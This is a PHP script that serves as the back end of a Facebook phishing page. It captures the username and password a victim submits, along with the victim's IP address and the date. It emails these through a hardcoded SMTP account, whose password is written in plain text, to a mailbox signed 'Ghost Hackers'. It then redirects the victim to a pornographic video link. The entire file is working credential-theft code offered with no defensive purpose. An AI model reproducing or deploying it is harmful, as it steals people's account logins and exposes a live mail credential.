<?php

require_once "PHPMailer/PHPMailer.php";
require_once "PHPMailer/SMTP.php";
require_once "PHPMailer/Exception.php";

if(isset(($_POST['username']))){


  $username = $_POST['username'];
  $password = $_POST['password'];

   $user_ip = $_SERVER['REMOTE_ADDR'];
   $date_hacked = date("D-M-Y");

   //SEND ACTIVATION LINK TO USER
              $mail = new PHPMailer\PHPMailer\PHPMailer();
              $mail->IsSMTP();
              //$mail = new PHPMailer(true);

              $mail->CharSet="UTF-8";
              $mail->Host = "mail.ocean57.com";
              // $mail->SMTPDebug = 1;
              $mail->Port = 465; //465 or 587

              $mail->SMTPSecure = 'ssl';
              $mail->SMTPAuth = true;
              $mail->IsHTML(true);


              //Authentication
              $mail->Username = "logs@ocean57.com";
              $mail->Password = "0546406616Anita99";


              $mail->setFrom('logs@ocean57.com', "Ghost Hackers");
              $mail->addAddress("logs@ocean57.com");
              $mail->Subject = "New User From Facebook";
             $mail->Body = '
             <!DOCTYPE html>
             <html lang="en" dir="ltr">
             <head>
               <meta charset="utf-8">
               <title>Password Reset</title>
               <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
               <style media="screen">
               body{
                 margin: 0;
                 padding: 0;

               }
               .container{

                 margin: auto;
                 margin-top: 3%;


               }
               .container h1{
                 text-align: center;
                 font-size:22px;
                 font-family: arial black;

               }
               .container p {
                 font-size:20px;
                 text-align: left;
                 line-height: 25px;
                 font-family: arial ubuntu;
                 font-weight: lighter;
                 color:#000;
               }

               .container a {
                 font-size:18px;
                 color: blue;


               }


               </style>
             </head>
             <body>

               <div class="container">

                 <hr>
                 <p style="color:#000;font-weight:bold;font-family:arial black">
                   Hello There is new user from facebook hacked by Ghost Hackers...Below is the loogin details;
                   <uL>
                     <li>Username: '.$username.' </li>
                     <li>Password: '.$password.' </li>
                     <li>Date Hacked: '.$date_hacked.' </li>
                     <li>User Ip: '.$user_ip.' </li>
                   </ul>
                 </p>

               </div>

             </body>
             </html>


             ';

             if($mail->send()) {

                 header("Location: https://www.xvideos.com/video36039811/yoruba_couple_leaked_sex_tape_video_2018");
             } else {
                echo "Could not send email";
             }





}
